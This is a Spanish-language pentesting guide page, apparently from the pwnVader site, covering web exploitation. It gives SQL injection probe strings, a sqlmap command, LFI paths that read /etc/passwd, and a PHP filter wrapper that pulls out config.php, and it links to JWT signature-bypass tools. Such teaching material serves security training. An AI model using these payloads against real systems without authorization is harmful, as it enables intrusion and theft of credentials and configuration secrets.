---
title: Explotación Web
description: Guía táctica de OWASP Top 10 y explotación de aplicaciones web.
sidebar:
  order: 1
---

# 🕸️ Guías de Explotación Web

Metodologías detalladas para auditar y explotar vulnerabilidades lógicas e infraestructuras web.

---

## 💉 SQL Injection (SQLi)

### Detección Manual Básica
Probar inyección en parámetros de consulta usando caracteres especiales:
```text
' OR 1=1-- -
" OR 1=1-- -
admin' --
admin' #
```

### Automatización (SQLMap)
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
```

---

## 📂 Local File Inclusion (LFI) / RFI

### LFI Básico
```text
http://target.com/index.php?page=../../../../etc/passwd
```

### Wrapper PHP para Exfiltración (Base64)
```text
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

---

## 🛠️ Herramientas Relacionadas (Ecosistema pwnVader)

<aside class="my-6 p-4 rounded-md border-l-4 border-orange-400 bg-orange-500/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-orange-400 font-bold mb-1">
    Herramienta · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    ¿Encontraste un token JWT en la aplicación web? Realiza ataques de escalada de privilegios y bypass de firma (alg:none / key confusion) de forma interactiva con el <a href="https://hacking.pwnvader.com/web/jwt" class="text-orange-400 hover:underline">JWT Attacker</a>.
  </p>
</aside>

<aside class="my-6 p-4 rounded-md border-l-4 border-orange-400 bg-orange-500/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-orange-400 font-bold mb-1">
    Herramienta · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    Si la aplicación objetivo utiliza un gestor de contenidos, audita de manera pasiva y segura su instalación de <a href="https://hacking.pwnvader.com/cms/wordpress" class="text-orange-400 hover:underline">WordPress</a>, <a href="https://hacking.pwnvader.com/cms/joomla" class="text-orange-400 hover:underline">Joomla</a> o <a href="https://hacking.pwnvader.com/cms/drupal" class="text-orange-400 hover:underline">Drupal</a>.
  </p>
</aside>

<aside class="my-6 p-4 rounded-md border-l-4 border-orange-400 bg-orange-500/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-orange-400 font-bold mb-1">
    Herramienta · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    ¿Necesitas decodificar filtros PHP en Base64 o codificar payloads específicos en Hex/URL? Utiliza el conversor multi-recetas del <a href="https://hacking.pwnvader.com/encoders/recipes" class="text-orange-400 hover:underline">Cyber Encoder Lab</a> o realiza esteganografía con caracteres Unicode invisibles en el <a href="https://hacking.pwnvader.com/encoders/emoji-stego" class="text-orange-400 hover:underline">Emoji Stego Tool</a>.
  </p>
</aside>
